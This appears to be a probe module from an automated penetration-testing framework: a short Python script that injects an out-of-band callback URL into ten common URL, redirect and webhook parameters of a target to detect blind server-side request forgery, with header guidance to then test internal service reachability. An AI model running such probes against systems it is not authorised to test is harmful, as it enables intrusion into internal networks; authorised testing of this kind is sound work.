# artex-name: intranet-blind-ssrf-oob-probe
# artex-severity: high
# artex-tags: ssrf,oob,blind,intranet
# artex-desc: Probe common URL/webhook/callback query parameters with the task's ARTEX_OOB_URL callback.
# artex-guidance: Confirm hit via oob_poll_hits; if confirmed, test bounded internal service reachability (within fence) to demonstrate SSRF impact.
import os, sys, urllib.parse, urllib.request

target = os.environ.get("ARTEX_POC_TARGET", "").strip()
oob_url = os.environ.get("ARTEX_OOB_URL", "").strip()
if not target or not oob_url:
    print("ARTEX_POC_TARGET and ARTEX_OOB_URL are required", file=sys.stderr)
    sys.exit(2)

params = ["url", "uri", "callback", "webhook", "redirect", "next", "dest", "target", "link", "src"]
sep = "&" if "?" in target else "?"
sent = 0
for p in params:
    probe = f"{target}{sep}{p}={urllib.parse.quote(oob_url + '/' + p, safe='')}"
    try:
        req = urllib.request.Request(probe, method="GET", headers={"User-Agent": "ARTEX-OOB-Probe/1.0"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            print(f"probed {p}: status={resp.status}")
        sent += 1
    except Exception as e:
        print(f"probed {p}: err={e}")
print(f"probes_sent={sent}; poll oob_poll_hits to confirm")
